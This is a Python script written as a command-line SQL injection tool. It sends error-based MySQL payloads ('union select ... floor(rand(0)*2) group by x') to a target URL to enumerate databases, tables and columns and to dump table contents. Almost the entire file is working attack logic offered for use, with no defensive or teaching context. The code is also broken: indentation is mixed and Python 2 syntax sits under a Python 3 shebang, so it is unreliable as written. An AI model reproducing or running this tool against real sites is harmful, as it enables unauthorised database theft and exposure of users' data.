#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

import sys
import requests
import re
import binascii
from termcolor import *
import optparse
 
fdata = []
 
def judge_columns_num(url):
         
        for i in range(1,100):
                columns_num_url = url + '\'' + 'order by ' + str(i) + '--+'
                rsp = requests.get(columns_num_url)
                rsp_content_length = rsp.headers['content-length']
                if i==1:
                        rsp_true_content_length = rsp_content_length
                        continue
                if rsp_content_length == rsp_true_content_length:
                        continue
                else:
                        print (colored('column nums is ' + str(i-1),"green",attrs=["bold"]))
                        columns_num = i
                        break
 
 
def getDatabases(url):
 
        dbs_url = url +  "' union select 1,count(*),concat((select count(distinct+table_schema) from information_schema.tables),0x26,floor(rand(0)*2))x from information_schema.tables group by x;--+"
            dbs_html = requests.get(dbs_url).content
            dbs_num = int(re.search(r'\'(\d*?)&',dbs_html).group(1))
            print "databases num:" + colored(dbs_num,"green",attrs=["bold"])
            dbs = []
            print ("dbs name: ")
            for dbIndex in xrange(0,dbs_num):
                db_name_url = url + "' union select 1,count(*),concat((select distinct table_schema from information_schema.tables limit %d,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+" % dbIndex
                db_html = requests.get(db_name_url).content
                db_name = re.search(r'\'(.*?)&', db_html).group(1)
                dbs.append(db_name)
                print (colored("\t%s" % db_name,"green",attrs=["bold"]))
 
 
 
def getTables(url, db_name):
            #db_name_hex = "0x" + binascii.b2a_hex(db_name)
            tables_num_url = url + "' union select 1,count(*),concat((select count(table_name) from information_schema.tables where table_schema='%s'),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+" % db_name
            tables_html = requests.get(tables_num_url).content
            tables_num = int(re.search(r'\'(\d*?)&',tables_html).group(1))
            print ("databases %s，tables num: %d" % (db_name, tables_num))
            print ("tables name: ")
            for tableIndex in xrange(0,tables_num):
                table_name_url = url + "'union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+" % (db_name, tableIndex)
                        table_html = requests.get(table_name_url).content
                table_name = re.search(r'\'(.*?)&',table_html).group(1)
                print (colored("\t%s" % table_name,"green",attrs=["bold"]))
 
 
 
def getColumns(url,db_name,table_name):
         
            #db_name_hex = "0x" + binascii.b2a_hex(db_name)
            #table_name_hex = "0x" + binascii.b2a_hex(table_name)
            dataColumns_num_url = url + "' union select 1,count(*),concat((select count(column_name) from information_schema.columns where table_schema='%s' and table_name='%s' ),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+" % (db_name,table_name)
            dataColumns_html = requests.get(dataColumns_num_url).content
        dataColumns_num = int(re.search(r'\'(\d*?)&',dataColumns_html).group(1))
            print ("table: %s，dataColumns num: %d" % (table_name, dataColumns_num))
            print ("DataColumns name：")
            for dataColumnIndex in xrange(0,dataColumns_num):
                dataColumn_name_url = url + "' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+" % (db_name,table_name,dataColumnIndex)
                dataColumn_html = requests.get(dataColumn_name_url).content
                dataColumn_name = re.search(r'\'(.*?)&',dataColumn_html).group(1)
                print (colored("\t\t%s" % dataColumn_name,"green",attrs=["bold"]))
 
 
 
 
def dumpData(url,db_name,table_name,inputColumns_name):
         
            #db_name_hex = "0x" + binascii.b2a_hex(db_name)
            #table_name_hex = "0x" + binascii.b2a_hex(table_name)
 
        dataColumns_num_url = url + "' union select 1,count(*),concat((select count(*) from %s.%s),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+" % (db_name,table_name)
            data_html = requests.get(dataColumns_num_url).content
            datas = int(re.search(r'\'(\d*?)&',data_html).group(1))
         
 
        inputColumns = inputColumns_name.split(',')
 
        print (colored("Total datas: " + str(datas),"green",attrs=["bold"]))
        print str(inputColumns_name) + ":"
         
            for inputColumnIndex in xrange(0,len(inputColumns)):
                 
                 
                for dataIndex in xrange(0,datas):
                 
                            dataColumn_name_url = url + "' union select 1,count(*),concat((select %s from %s.%s limit %d,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+" % (inputColumns[inputColumnIndex],db_name,table_name,dataIndex)
                            data_html = requests.get(dataColumn_name_url).content
                            data = re.search(r'\'(.*?)&',data_html).group(1)
                        fdata.append(data)
                            print (colored("\t%s" % data,"green",attrs=["bold"]))
        for inputc in range(0,len(inputColumns)):
                print str(inputColumns[inputc]) + "\t",
        print ""
        print "+++++++++++++++++++++++++++++++++++++++++++++++++"
        n = len(fdata) / len(inputColumns)
        for t in range(0,n):
                for d in range(t,len(fdata),n):
                        print colored(fdata[d],"green",attrs=["bold"]) + "\t",
                print ""
        print "+++++++++++++++++++++++++++++++++++++++++++++++++"
                 
                 
 
 
                 
                         
 
 
def main():
         
            parser = optparse.OptionParser('python %prog '+\
                 '-h <manual>')
            parser.add_option('-u', dest='tgtUrl', type='string',\
                 help='input target url')
            parser.add_option('--dbs', dest='dbs', action='store_true', help='get dbs')
        parser.add_option('--tables', dest='tables', action='store_true',\
           help='get tables')
        parser.add_option('--columns', dest='columns', action='store_true',\
           help='get columns')
 
            parser.add_option('-D', dest='db', type='string', help='choose a db')
        parser.add_option('-T', dest='table', type='string',\
           help='choose a table')
        parser.add_option('-C', dest='column', type='string',\
           help='choose column(s)')
        parser.add_option('--dump', dest='data', action='store_true',\
           help='get datas')
     
            (options, args) = parser.parse_args()
         
        url = options.tgtUrl
        dbs = options.dbs
        tables = options.tables
        columns = options.columns
        db = options.db
        table = options.table
        column = options.column
        datas = options.data
         
         
        if url and (dbs is None and db is None and tables is None and table is None and columns is None and column is None and datas is None):
                judge_columns_num(url)
         
 
        if url and dbs:
                getDatabases(url)
        if url and db and tables:
                getTables(url,db)
        if url and db and table and columns:
                getColumns(url,db,table)
        if url and db and table and column and datas:
                dumpData(url,db,table,column)
                 
                 
         
 
if __name__ == '__main__':
    main()